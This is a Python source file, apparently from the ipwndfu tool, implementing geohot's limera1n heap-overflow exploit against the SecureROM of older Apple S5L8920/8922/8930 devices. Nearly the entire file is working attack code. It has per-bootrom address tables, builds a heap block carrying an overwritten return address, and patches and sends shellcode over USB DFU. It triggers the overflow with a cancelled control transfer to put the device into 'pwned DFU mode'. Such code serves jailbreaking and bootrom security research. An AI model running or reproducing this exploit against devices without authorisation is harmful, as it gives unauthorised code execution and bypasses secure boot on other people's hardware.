# Credit: This file is based on limera1n exploit (heap overflow) by geohot.
from __future__ import annotations

import array
import ctypes
import dataclasses
import struct
import sys
import time

import usb  # type: ignore
from ipwndfu import dfu

# Must be global so garbage collector never frees it
request = None
transfer_ptr = None

constants_359_3 = [
    0x84031800,  # 1 - RELOCATE_SHELLCODE_ADDRESS
    1024,  # 2 - RELOCATE_SHELLCODE_SIZE
    0x83D4,  # 3 - memmove
    0x84034000,  # 4 - MAIN_STACK_ADDRESS
    0x43C9,  # 5 - nor_power_on
    0x5DED,  # 6 - nor_init
    0x84024820,  # 7 - gUSBSerialNumber
    0x8E7D,  # 8 - strlcat
    0x349D,  # 9 - usb_wait_for_image
    0x84000000,  # 10 - LOAD_ADDRESS
    0x24000,  # 11 - MAX_SIZE
    0x84024228,  # 12 - gLeakingDFUBuffer
    0x1CCD,  # 13 - free
    0x65786563,  # 14 - EXEC_MAGIC
    0x1F79,  # 15 - memz_create
    0x3969,  # 16 - jump_to
    0x1FA1,  # 17 - memz_destroy
    0x60,  # 18 - IMAGE3_LOAD_SP_OFFSET
    0x50,  # 19 - IMAGE3_LOAD_STRUCT_OFFSET
    0x1FE5,  # 20 - image3_create_struct
    0x2655,  # 21 - image3_load_continue
    0x277B,  # 22 - image3_load_fail
]

constants_359_3_2 = [
    0x84031800,  # 1 - RELOCATE_SHELLCODE_ADDRESS
    1024,  # 2 - RELOCATE_SHELLCODE_SIZE
    0x83DC,  # 3 - memmove
    0x84034000,  # 4 - MAIN_STACK_ADDRESS
    0x43D1,  # 5 - nor_power_on
    0x5DF5,  # 6 - nor_init
    0x84024820,  # 7 - gUSBSerialNumber
    0x8E85,  # 8 - strlcat
    0x34A5,  # 9 - usb_wait_for_image
    0x84000000,  # 10 - LOAD_ADDRESS
    0x24000,  # 11 - MAX_SIZE
    0x84024228,  # 12 - gLeakingDFUBuffer
    0x1CCD,  # 13 - free
    0x65786563,  # 14 - EXEC_MAGIC
    0x1F81,  # 15 - memz_create
    0x3971,  # 16 - jump_to
    0x1FA9,  # 17 - memz_destroy
    0x60,  # 18 - IMAGE3_LOAD_SP_OFFSET
    0x50,  # 19 - IMAGE3_LOAD_STRUCT_OFFSET
    0x1FED,  # 20 - image3_create_struct
    0x265D,  # 21 - image3_load_continue
    0x2783,  # 22 - image3_load_fail
]

constants_359_5 = [
    0x84031800,  # 1 - RELOCATE_SHELLCODE_ADDRESS
    1024,  # 2 - RELOCATE_SHELLCODE_SIZE
    0x8564,  # 3 - memmove
    0x84034000,  # 4 - MAIN_STACK_ADDRESS
    0x43B9,  # 5 - nor_power_on
    0x5F75,  # 6 - nor_init
    0x84024750,  # 7 - gUSBSerialNumber
    0x901D,  # 8 - strlcat
    0x36E5,  # 9 - usb_wait_for_image
    0x84000000,  # 10 - LOAD_ADDRESS
    0x24000,  # 11 - MAX_SIZE
    0x84024158,  # 12 - gLeakingDFUBuffer
    0x1A51,  # 13 - free
    0x65786563,  # 14 - EXEC_MAGIC
    0x1F25,  # 15 - memz_create
    0x39DD,  # 16 - jump_to
    0x1F0D,  # 17 - memz_destroy
    0x64,  # 18 - IMAGE3_LOAD_SP_OFFSET
    0x60,  # 19 - IMAGE3_LOAD_STRUCT_OFFSET
    0x2113,  # 20 - image3_create_struct
    0x2665,  # 21 - image3_load_continue
    0x276D,  # 22 - image3_load_fail
]

constants_574_4 = [
    0x84039800,  # 1 - RELOCATE_SHELLCODE_ADDRESS
    1024,  # 2 - RELOCATE_SHELLCODE_SIZE
    0x84DC,  # 3 - memmove
    0x8403C000,  # 4 - MAIN_STACK_ADDRESS
    0x4E8D,  # 5 - nor_power_on
    0x690D,  # 6 - nor_init
    0x8402E0E0,  # 7 - gUSBSerialNumber
    0x90C9,  # 8 - strlcat
    0x4C85,  # 9 - usb_wait_for_image
    0x84000000,  # 10 - LOAD_ADDRESS
    0x2C000,  # 11 - MAX_SIZE
    0x8402DBCC,  # 12 - gLeakingDFUBuffer
    0x3B95,  # 13 - free
    0x65786563,  # 14 - EXEC_MAGIC
    0x7469,  # 15 - memz_create
    0x5A5D,  # 16 - jump_to
    0x7451,  # 17 - memz_destroy
    0x68,  # 18 - IMAGE3_LOAD_SP_OFFSET
    0x64,  # 19 - IMAGE3_LOAD_STRUCT_OFFSET
    0x412D,  # 20 - image3_create_struct
    0x46DB,  # 21 - image3_load_continue
    0x47DB,  # 22 - image3_load_fail
]


@dataclasses.dataclass
class DeviceConfig:
    version: str
    cpid: str
    exploit_lr: int
    max_size: int
    constants: list[int]


configs = [
    DeviceConfig("359.3", "8920", 0x84033FA4, 0x24000, constants_359_3),
    # S5L8920 (old bootrom)
    DeviceConfig("359.3.2", "8920", 0x84033FA4, 0x24000, constants_359_3_2),
    # S5L8920 (new bootrom)
    DeviceConfig("359.5", "8922", 0x84033F98, 0x24000, constants_359_5),
    # S5L8922
    DeviceConfig("574.4", "8930", 0x8403BF9C, 0x2C000, constants_574_4),
    # S5L8930
]


def create_control_transfer(device, request, timeout):
    ptr = usb.backend.libusb1._lib.libusb_alloc_transfer(0)
    assert ptr is not None

    transfer = ptr.contents
    transfer.dev_handle = device._ctx.handle.handle
    transfer.endpoint = 0  # EP0
    transfer.type = 0  # LIBUSB_TRANSFER_TYPE_CONTROL
    transfer.timeout = timeout
    transfer.buffer = request.buffer_info()[0]  # C-pointer to request buffer
    transfer.length = len(request)
    transfer.user_data = None
    transfer.callback = usb.backend.libusb1._libusb_transfer_cb_fn_p(0)  # NULL
    transfer.flags = 1 << 1  # LIBUSB_TRANSFER_FREE_BUFFER

    return ptr


def limera1n_libusb1_async_ctrl_transfer(
    device, bm_request_type, b_request, w_value, w_index, data, timeout
):
    if usb.backend.libusb1._lib is not device._ctx.backend.lib:
        print(
            "ERROR: This exploit requires libusb1 backend, but another backend is being used. Exiting."
        )
        sys.exit(1)

    request = array.array(
        "B",
        struct.pack("<BBHHH", bm_request_type, b_request, w_value, w_index, len(data))
        + data,
    )
    transfer_ptr = create_control_transfer(device, request, timeout)
    assert usb.backend.libusb1._lib.libusb_submit_transfer(transfer_ptr) == 0

    time.sleep(timeout / 1000.0)

    # Prototype of libusb_cancel_transfer is missing from pyusb
    usb.backend.libusb1._lib.libusb_cancel_transfer.argtypes = [
        ctypes.POINTER(usb.backend.libusb1._libusb_transfer)
    ]
    assert usb.backend.libusb1._lib.libusb_cancel_transfer(transfer_ptr) == 0


def generate_payload(constants, exploit_lr):
    with open("bin/limera1n-shellcode.bin", "rb") as f:
        shellcode = f.read()

    # Shellcode has placeholder values for constants; check they match and
    # replace with constants from config
    placeholders_offset = len(shellcode) - 4 * len(constants)
    for i in range(len(constants)):
        offset = placeholders_offset + 4 * i
        (value,) = struct.unpack("<I", shellcode[offset : offset + 4])
        assert value == 0xBAD00001 + i

    shellcode_address = 0x84000400 + 1
    heap_block = struct.pack(
        "<4I48s", 0x405, 0x101, shellcode_address, exploit_lr, "\xCC" * 48
    )
    return (
        heap_block * 16
        + shellcode[:placeholders_offset]
        + struct.pack(f"<{len(constants)}I", *constants)
    )


def exploit():
    print("*** based on limera1n exploit (heap overflow) by geohot ***")

    device = dfu.acquire_device()
    print("Found:", device.serial_number)

    if "PWND:[" in device.serial_number:
        print("Device is already in pwned DFU Mode. Not executing exploit.")
        return

    chosen_config = None
    for config in configs:
        if f"SRTG:[iBoot-{config.version}]" in device.serial_number:
            chosen_config = config
            break
    if chosen_config is None:
        for config in configs:
            if f"CPID:{config.cpid}" in device.serial_number:
                print(
                    "ERROR: CPID is compatible, but serial number string does not match."
                )
                print(
                    "Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting."
                )
                sys.exit(1)
        print(
            "ERROR: Not a compatible device. This exploit is for S5L8920/S5L8922/S5L8930 devices only. Exiting."
        )
        sys.exit(1)

    dfu.send_data(
        device, generate_payload(chosen_config.constants, chosen_config.exploit_lr)
    )

    assert len(device.ctrl_transfer(0xA1, 1, 0, 0, 1, 1000)) == 1

    limera1n_libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, "A" * 0x800, 10)

    try:
        device.ctrl_transfer(0x21, 2, 0, 0, 0, 10)
        print(
            "ERROR: This request succeeded, but it should have raised an exception. Exiting."
        )
        sys.exit(1)
    except usb.core.USBError:
        # OK: This request should have raised USBError.
        pass

    dfu.usb_reset(device)
    dfu.release_device(device)

    device = dfu.acquire_device()
    dfu.request_image_validation(device)
    dfu.release_device(device)

    time.sleep(0.5)

    device = dfu.acquire_device()
    failed = "PWND:[limera1n]" not in device.serial_number
    dfu.release_device(device)

    if failed:
        print("ERROR: Exploit failed. Device did not enter pwned DFU Mode.")
        sys.exit(1)

    print("Device is now in pwned DFU Mode.")
